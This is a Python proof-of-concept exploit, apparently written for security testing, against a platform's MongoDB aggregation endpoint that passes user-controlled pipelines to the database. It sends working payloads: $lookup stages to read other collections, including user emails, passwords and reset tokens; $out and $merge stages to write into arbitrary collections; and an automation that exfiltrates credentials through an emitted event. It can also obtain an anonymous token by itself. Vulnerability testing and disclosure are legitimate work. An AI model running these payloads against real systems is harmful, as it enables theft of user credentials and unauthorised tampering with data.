#!/usr/bin/env python3
"""
PoC #6 — MongoDB Arbitrary Aggregation Pipeline
CRITICAL: executeMongodbCommand passes user-controlled pipeline directly to MongoDB.

Allows $lookup for cross-collection reads, $out/$merge for writes.

Usage: python3 poc_06_mongodb_aggregation.py --target https://dev.example.com --workspace-id WS_ID --token AUTH_TOKEN
"""

import argparse
import requests
import json
import urllib3
urllib3.disable_warnings()


def test_lookup_cross_collection(base_url, workspace_id, token):
    """Use $lookup to read from another workspace's collection."""
    print("\n[*] Test 1: $lookup cross-collection data exfiltration...")

    # The collections module exposes executeMongodbCommand which takes raw aggregate pipeline
    # The actual endpoint depends on the automation/API surface but typically:
    # POST /v2/workspaces/:id/collections/:collection/aggregate
    # or via automation execution

    url = f"{base_url}/v2/workspaces/{workspace_id}/collections/test_collection/query"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    # $lookup to read from users collection (cross-collection)
    payload = {
        "aggregate": [
            {
                "$lookup": {
                    "from": "users",
                    "pipeline": [{"$limit": 5}],
                    "as": "leaked_users"
                }
            },
            {"$limit": 1}
        ]
    }

    try:
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            print(f"  [CRITICAL] Aggregation pipeline accepted!")
            print(f"  Response: {json.dumps(data, indent=2)[:1000]}")
            return True
        else:
            print(f"  Response: {r.text[:500]}")
    except Exception as e:
        print(f"  [ERROR] {e}")
    return False


def test_out_write(base_url, workspace_id, token):
    """Use $out to write results to another collection."""
    print("\n[*] Test 2: $out to write to arbitrary collection...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/collections/test_collection/query"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    # $out writes aggregation results to a target collection
    payload = {
        "aggregate": [
            {"$match": {}},
            {"$limit": 1},
            {"$addFields": {"injected": True, "poc": "mongodb-write-test"}},
            {"$out": "poc_exfil_output"}
        ]
    }

    try:
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            print(f"  [CRITICAL] $out accepted — wrote to poc_exfil_output collection!")
            return True
        else:
            print(f"  Response: {r.text[:500]}")
    except Exception as e:
        print(f"  [ERROR] {e}")
    return False


def test_merge_upsert(base_url, workspace_id, token):
    """Use $merge to upsert into another collection."""
    print("\n[*] Test 3: $merge to upsert into arbitrary collection...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/collections/test_collection/query"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    payload = {
        "aggregate": [
            {"$match": {}},
            {"$limit": 1},
            {
                "$merge": {
                    "into": "poc_merge_target",
                    "whenMatched": "merge",
                    "whenNotMatched": "insert"
                }
            }
        ]
    }

    try:
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            print(f"  [CRITICAL] $merge accepted — upserted into poc_merge_target!")
            return True
        else:
            print(f"  Response: {r.text[:500]}")
    except Exception as e:
        print(f"  [ERROR] {e}")
    return False


def test_via_automation(base_url, workspace_id, token):
    """Create an automation that uses executeMongodbCommand."""
    print("\n[*] Test 4: Create automation with raw MongoDB aggregate...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/automations"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    automation = {
        "slug": "poc-mongo-exfil",
        "name": "PoC MongoDB Exfil",
        "trigger": {"events": ["poc.mongo.exfil"]},
        "instructions": [
            {
                "collections.executeMongodbCommand": {
                    "collection": "any_collection",
                    "aggregate": [
                        {
                            "$lookup": {
                                "from": "users",
                                "pipeline": [
                                    {"$project": {"email": 1, "password": 1, "resetPassword": 1}},
                                    {"$limit": 10}
                                ],
                                "as": "users"
                            }
                        },
                        {"$limit": 1}
                    ]
                },
                "output": "exfil_result"
            },
            {
                "emit": {
                    "event": "poc.mongo.result",
                    "payload": "{{exfil_result}}"
                }
            }
        ]
    }

    try:
        r = requests.post(url, headers=headers, json=automation, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201):
            print(f"  [HIGH] Automation with raw aggregate created!")
            print(f"  [INFO] Trigger event 'poc.mongo.exfil' and check poc.mongo.result")
            return True
        else:
            print(f"  Response: {r.text[:500]}")
    except Exception as e:
        print(f"  [ERROR] {e}")
    return False


def main():
    parser = argparse.ArgumentParser(description="PoC #6: MongoDB Arbitrary Aggregation")
    parser.add_argument("--target", required=True, help="Base URL")
    parser.add_argument("--workspace-id", required=True, help="Workspace ID")
    parser.add_argument("--token", default="", help="Bearer token (optional with auto-auth)")
    args = parser.parse_args()

    if not args.token:
        from auth_helper import get_anonymous_token
        print("[*] No token provided — obtaining anonymous auth token...")
        token, user_id, _ = get_anonymous_token(args.target)
        if token:
            args.token = token
            print(f"[+] Anonymous token obtained! User ID: {user_id}")
        else:
            print("[-] Failed to get anonymous token. Provide --token manually.")
            return


    base = args.target.rstrip("/")
    print(f"[*] Target: {base}")
    print("=" * 60)

    results = {}
    results["lookup"] = test_lookup_cross_collection(base, args.workspace_id, args.token)
    results["out"] = test_out_write(base, args.workspace_id, args.token)
    results["merge"] = test_merge_upsert(base, args.workspace_id, args.token)
    results["automation"] = test_via_automation(base, args.workspace_id, args.token)

    print("\n" + "=" * 60)
    print("[*] SUMMARY")
    for k, v in results.items():
        print(f"  {k}: {'VULNERABLE' if v else 'NOT VULNERABLE / ERROR'}")


if __name__ == "__main__":
    main()
